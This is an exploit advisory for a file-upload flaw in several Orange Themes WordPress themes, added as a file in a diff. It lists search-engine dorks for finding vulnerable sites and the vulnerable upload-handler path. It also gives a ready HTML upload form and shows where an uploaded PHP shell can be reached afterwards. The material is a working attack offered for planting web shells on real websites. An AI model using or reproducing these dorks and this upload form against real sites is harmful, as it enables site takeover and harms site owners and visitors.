@@ -1,0 +1,49 @@
+#Title : Wordpress Orange Themes CSRF File Upload Vulnerability
+#Author : Jje Incovers
+#Date : 01/12/2013 - 17 November 2013
+#Category : Web Applications
+#Type : PHP
+#Vendor : http://www.orange-themes.com/
+#Download : http://www.orange-themes.com/portfolio/
+#Tested : Mozila, Chrome, Opera -> Windows & Linux
+#Vulnerabillity : CSRF
+#Scanning Theme : [ Agritourismo , Forca , Grandis , Legatus , Reganto , Sportimo , Piccione , Bulteno , Coloris , Botanica , Project 10 , Pinword , Rockstar , Kernel , Bordeaux , Radial , Oxygen , Ray Of Light , Gadgetine ] -theme
+
+#Dork : 
+inurl:"/wp-content/themes/agritourismo-theme/"
+inurl:"/wp-content/themes/bordeaux-theme/"
+inurl:"/wp-content/themes/bulteno-theme/"
+inurl:"/wp-content/themes/oxygen-theme/"
+inurl:"/wp-content/themes/radial-theme/"
+inurl:"/wp-content/themes/rayoflight-theme/"
+inurl:"/wp-content/themes/reganto-theme/"
+inurl:"/wp-content/themes/rockstar-theme/"  
+
+CSRF File Upload Vulnerability
+
+Exploit & POC : 
+
+http://site-target/wp-content/themes/rockstar-theme/functions/upload-handler.php
+
+Script :
+
+<form enctype="multipart/form-data"
+action="http://127.0.0.1/wp-content/themes/rockstar-theme/functions/upload-handler.php" method="post"> 
+Your File: <input name="uploadfile" type="file" /><br /> 
+<input type="submit" value="upload" /> 
+</form> 
+
+
+File Access :
+
+http://site-target/wp-content/uploads/[years]/[month]/your_shell.php
+
+Example : http://127.0.0.1/wp-content/uploads/2013/13/inc0vers.php
+
+Note :
+Script CSRF equate with dork you use
+
+########################################
+#Greetz : 0day-id.com | newbie-security.or.id | SANJUNGAN JIWA
+#Thanks : Akira | Xie Log | - SANJUNGAN JIWA
+########################################
